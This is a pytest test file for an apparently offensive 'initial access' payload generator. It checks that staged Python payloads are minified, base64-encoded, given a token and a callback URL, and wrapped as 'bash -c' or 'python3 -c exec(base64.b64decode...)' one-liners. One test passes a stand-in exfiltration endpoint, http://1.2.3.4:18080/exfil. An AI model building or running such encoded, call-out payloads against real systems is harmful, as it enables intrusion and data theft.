# ================================================================
# TESTS: LOIS Payload Generator
# ================================================================

import base64
import pytest
from quantum_mechanic.techniques.initial_access.lois.generator import (
    generate_payload,
    minify_python,
)

def test_minify_python():
    source = """
# This is a comment
def foo():
    # another comment
    print("hello")

"""
    minified = minify_python(source)
    assert "# This is a comment" not in minified
    assert "# another comment" not in minified
    assert 'print("hello")' in minified
    assert "def foo():" in minified

def test_generate_payload_token_injection():
    # Use stage0.py as it has the TOKEN placeholder
    payload, token = generate_payload("stage0.py", wrapper="raw", minify=False)
    
    # Decode and check for token
    decoded = base64.b64decode(payload).decode()
    assert token in decoded
    assert "__QM_TOKEN__" not in decoded

def test_generate_payload_callback_injection():
    # Use neutrino_junos.py as it has the CALLBACK_URL placeholder
    callback = "http://1.2.3.4:18080/exfil"
    payload, token = generate_payload(
        "neutrino_junos.py", 
        wrapper="raw", 
        minify=False, 
        callback_url=callback
    )
    
    decoded = base64.b64decode(payload).decode()
    assert callback in decoded
    assert "__QM_CALLBACK__" not in decoded
    assert token in decoded

def test_wrappers():
    # Bash wrapper
    payload_bash, _ = generate_payload("stage0.py", wrapper="bash")
    assert payload_bash.startswith('bash -c "')
    assert "python3" in payload_bash
    
    # Python wrapper
    payload_py, _ = generate_payload("stage0.py", wrapper="python")
    assert payload_py.startswith('python3 -c "')
    assert "exec(base64.b64decode" in payload_py
    
    # Raw wrapper
    payload_raw, _ = generate_payload("stage0.py", wrapper="raw")
    # Should just be b64
    base64.b64decode(payload_raw) # should not raise
